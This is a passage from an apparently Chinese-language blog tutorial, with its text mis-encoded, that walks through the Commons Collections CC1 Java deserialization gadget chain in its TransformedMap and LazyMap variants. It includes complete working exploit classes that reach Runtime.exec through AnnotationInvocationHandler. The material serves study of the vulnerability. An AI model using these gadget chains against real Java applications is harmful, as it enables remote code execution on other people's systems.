class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// è£…é¥°ä¸º TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// æ„é€  AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹è·Ÿç¨‹åºï¼Œå‘ç° <code>setValue()</code> å¤„ä¸­çš„å‚æ•°å¹¶ä¸å¯æ§ï¼Œè€Œæ˜¯æŒ‡å®šäº† <code>AnnotationTypeMismatchExceptionProxy</code> ç±»ï¼Œæ˜¯æ— æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œèƒ½å¤Ÿå¯æ§ <code>setValue</code> çš„å‚æ•°ã€‚</p><h3 id="é—®é¢˜ä¸‰ï¼šå¦‚ä½•æ§åˆ¶setValueå‚æ•°"><a href="#é—®é¢˜ä¸‰ï¼šå¦‚ä½•æ§åˆ¶setValueå‚æ•°" class="headerlink" title="é—®é¢˜ä¸‰ï¼šå¦‚ä½•æ§åˆ¶setValueå‚æ•°"></a>é—®é¢˜ä¸‰ï¼šå¦‚ä½•æ§åˆ¶setValueå‚æ•°</h3><ul><li>æˆ‘ä»¬è¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªèƒ½å¤Ÿè§£å†³ <code>setValue</code> å¯æ§å‚æ•°çš„ç±» â€”â€”â€”â€” <code>ConstantTransformer</code>ã€‚</li></ul><p>è¿™ä¸ªç±»å®Œç¾ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Œç‚¹è¿›å»çœ‹ä¸€çœ‹ã€‚</p><p><img src="/img/CC1/c27.png"></p><p>å‘ç°ä¼ å…¥ä»€ä¹ˆï¼Œtransformæ–¹æ³•å°±ä¼šè¿”å›ä»€ä¹ˆ</p><p>åˆ©ç”¨æ­¤ç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶transformä¼ å…¥çš„valueå€¼</p><p>æˆ‘ä»¬å…ˆä¼ å…¥ä¸€ä¸ª <code>Runtime.class</code>ï¼Œç„¶åæ— è®º <code>transform()</code> æ–¹æ³•ä¼šè°ƒç”¨ä»€ä¹ˆå¯¹è±¡ï¼Œéƒ½ä¼šè¿”å› <code>Runtime.class</code></p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// è£…é¥°ä¸º TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// æ„é€  AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="/img/CC1/c28.png"></p><h3 id="è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“"><a href="#è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“" class="headerlink" title="è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“"></a>è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//åˆ©ç”¨é“¾<br>InvokerTransformer#transform<br>TransformedMap#checkSetValue<br>AbstractInputCheckedMapDecorator#setValue<br>AnnotationInvocationHandler#readObject<br><br>//è¾…åŠ©é“¾<br>ChainedTransformer   //å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨<br>ConstantTransformer  //ä½¿setValueçš„Valueå€¼ä¸ºRuntime.classå¼€å¯æ”»å‡»<br>HashMap              //éå†æ•°ç»„æ—¶è°ƒç”¨åˆ°setValue<br></code></pre></td></tr></table></figure><p><img src="/img/CC1/c29.png"></p><h2 id="LazyMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ"><a href="#LazyMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ" class="headerlink" title="LazyMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ"></a>LazyMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ</h2><h3 id="å¯»æ‰¾é“¾å­"><a href="#å¯»æ‰¾é“¾å­" class="headerlink" title="å¯»æ‰¾é“¾å­"></a>å¯»æ‰¾é“¾å­</h3><ul><li>è¿™æ¡é“¾å­çš„å°¾éƒ¨ä¾æ—§æ˜¯InvokerTransformerçš„transformæ–¹æ³•ï¼Œåˆ©ç”¨å…¶è°ƒç”¨execæ‰§è¡Œå‘½ä»¤</li><li>ä¸TransformMapç‰ˆä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨<code>InvokeTransformer</code> ä¸‹çš„ <code>transform</code> æ–¹æ³•ï¼Œè¿›è¡Œ æŸ¥æ‰¾ç”¨æ³•æ“ä½œæ—¶ï¼Œé€‰æ‹©äº†LazyMapç±»</li></ul><p><img src="/img/CC1/c30.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»çš„getæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•</p><p>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ˜¯protectedç±»å‹ï¼Œæ— æ³•ç›´æ¥æ–°å»ºå®ä¾‹</p><p>çœ‹åˆ°ç†Ÿæ‚‰çš„decorateæ–¹æ³•</p><p>è¿™é‡Œä¾æ—§åˆ©ç”¨decorateæ–¹æ³•æ–°å»ºå®ä¾‹</p><p><img src="/img/CC1/c31.png"></p><p>æˆ‘ä»¬æ„é€ å¦‚ä¸‹çš„ EXPï¼Œæ¥è¯æ˜è¿™æ¡é“¾å­æš‚æ—¶æ˜¯å¯è¡Œçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);<br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">lazyGetMethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br>        lazyGetMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        lazyGetMethod.invoke(decorateMap, runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½å¤ŸæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ç»§ç»­æŸ¥æ‰¾getæ–¹æ³•çš„ç”¨æ³•</p><p>æ¥åˆ°AnnotationInvocationHandlerçš„invokeæ–¹æ³•</p><p><img src="/img/CC1/c32.png"></p><p>åŒæ—¶è¿™ä¸ªç±»ä¹Ÿéå¸¸å¥½ï¼Œå®ƒé‡Œé¢æœ‰ <code>readObject()</code> æ–¹æ³•ï¼Œå¯ä»¥ä½œä¸ºæˆ‘ä»¬çš„å…¥å£ç±»ã€‚</p><ul><li>ç°åœ¨çš„å…³é”®ç‚¹åœ¨äºæˆ‘ä»¬è¦è§¦å‘ <code>AnnotationInvocationHandler.invoke()</code></li></ul><h3 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h3><p>éœ€è¦è§¦å‘ <code>invoke</code> æ–¹æ³•ï¼Œé©¬ä¸Šæƒ³åˆ°åŠ¨æ€ä»£ç†ï¼Œä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†äº†ä¹‹åï¼Œæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»çš„æ–¹æ³•ï¼Œå°±ä¸€å®šä¼šè°ƒç”¨ <code>invoke()</code> æ–¹æ³•ã€‚æˆ‘ä»¬å»æ‰¾ä¸€æ‰¾èƒ½åˆ©ç”¨çš„åœ°æ–¹</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹invokeè¿™ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();                <span class="hljs-comment">// è·å–è¢«è°ƒç”¨çš„æ–¹æ³•å</span><br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); <span class="hljs-comment">// è·å–å‚æ•°ç±»å‹åˆ—è¡¨</span><br><br>    <span class="hljs-comment">// å¤„ç† Object ç±»å’Œ Annotation æ¥å£è‡ªå¸¦çš„æ–¹æ³•</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]); <span class="hljs-comment">// å¦‚æœè°ƒç”¨çš„æ˜¯ equals(Object)ï¼Œäº¤ç»™ equalsImpl å®ç°</span><br><br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br>        <span class="hljs-comment">// æ³¨è§£æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ï¼Œå¦‚æœæœ‰å‚æ•°å°±æŠ›å¼‚å¸¸</span><br><br>    <span class="hljs-comment">// é’ˆå¯¹å‡ ä¸ªç‰¹æ®Šæ–¹æ³•åšå¤„ç†</span><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>        <span class="hljs-keyword">return</span> toStringImpl();     <span class="hljs-comment">// è°ƒç”¨ toString æ—¶ï¼Œè¿”å›è‡ªå®šä¹‰å®ç°</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>        <span class="hljs-keyword">return</span> hashCodeImpl();     <span class="hljs-comment">// è°ƒç”¨ hashCode æ—¶ï¼Œè¿”å›è‡ªå®šä¹‰å®ç°</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>        <span class="hljs-keyword">return</span> type;               <span class="hljs-comment">// è°ƒç”¨ annotationType æ—¶ï¼Œè¿”å›æ³¨è§£çš„ç±»å‹å¯¹è±¡</span><br>    &#125;<br><br>    <span class="hljs-comment">// å¤„ç†æ™®é€šæ³¨è§£æˆå‘˜æ–¹æ³•ï¼ˆå³æ³¨è§£é‡Œçš„å±æ€§ï¼‰</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);  <span class="hljs-comment">// ä»æˆå‘˜å˜é‡ Map ä¸­è·å–å¯¹åº”å€¼</span><br><br>    <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br>        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å€¼ï¼Œè¯´æ˜æ³¨è§£ä¿¡æ¯ä¸å®Œæ•´ï¼ŒæŠ›å‡ºå¼‚å¸¸</span><br><br>    <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>        <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br>        <span class="hljs-comment">// å¦‚æœæ˜¯å¼‚å¸¸ä»£ç†å¯¹è±¡ï¼Œåˆ™æŠ›å‡ºå¯¹åº”å¼‚å¸¸</span><br><br>    <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>        result = cloneArray(result);<br>        <span class="hljs-comment">// å¦‚æœå€¼æ˜¯æ•°ç»„ï¼Œå¹¶ä¸”éç©ºï¼Œåˆ™å…‹éš†ä¸€ä»½ï¼Œé¿å…å¤–éƒ¨ä¿®æ”¹åŸå§‹æ•°æ®</span><br><br>    <span class="hljs-keyword">return</span> result; <span class="hljs-comment">// è¿”å›å¯¹åº”çš„æ³¨è§£æˆå‘˜å€¼</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>memberValueså¿…é¡»æ˜¯æ— å‚æ–¹æ³•</li></ul><p>å¯»æ‰¾æ˜¯å¦æœ‰æ— å‚æ–¹æ³•çš„è°ƒç”¨</p><p><img src="/img/CC1/c33.png"></p><p>æ­£å¥½çœ‹åˆ°readObjectä¸­æœ‰memberValuesè°ƒç”¨äº†entrySetï¼ŒentrySetæ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•</p><p>åœ¨è¿™é‡Œè°ƒç”¨äº† <code>entrySet()</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°† <code>memberValues</code> çš„å€¼æ”¹ä¸ºä»£ç†å¯¹è±¡ï¼Œå½“è°ƒç”¨ä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šè·³åˆ°æ‰§è¡Œ <code>invoke()</code> æ–¹æ³•ï¼Œæœ€ç»ˆå®Œæˆæ•´æ¡é“¾å­çš„è°ƒç”¨ã€‚</p><p>å…³äºmemberValueå’Œæ‰¾åˆ°çš„æ— å‚æ–¹æ³•çš„ç†è§£ï¼š</p><p>1.<code>memberValues</code> æ˜¯ä»€ä¹ˆ</p><p>åœ¨ä½ è¿™æ®µä»£ç é‡Œï¼Œæ ¸å¿ƒå­—æ®µæ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br></code></pre></td></tr></table></figure><ul><li><p><code>memberValues</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ª <strong>Map</strong>ï¼Œç±»å‹å¤§æ¦‚æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; memberValues;<br></code></pre></td></tr></table></figure></li><li><p><strong>ä½œç”¨</strong>ï¼šå­˜æ”¾æ³¨è§£æ¯ä¸ªæˆå‘˜ï¼ˆå±æ€§ï¼‰çš„å€¼ã€‚</p><ul><li>Keyï¼šæ³¨è§£æ–¹æ³•åï¼ˆæ¯”å¦‚ <code>&quot;value&quot;</code>, <code>&quot;name&quot;</code>ï¼‰ã€‚</li><li>Valueï¼šå¯¹åº”çš„å€¼ï¼ˆæ¯”å¦‚ <code>&quot;Hello&quot;</code>, <code>123</code>ï¼Œæˆ–è€…æ•°ç»„ï¼‰ã€‚</li></ul></li></ul><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@interface</span> MyAnno &#123;<br>    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">18</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MyAnno(name=&quot;Tom&quot;)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆ <code>memberValues</code> å¤§æ¦‚é•¿è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;name&quot;</span> -&gt; <span class="hljs-string">&quot;Tom&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>  -&gt; <span class="hljs-number">18</span>   <span class="hljs-comment">// 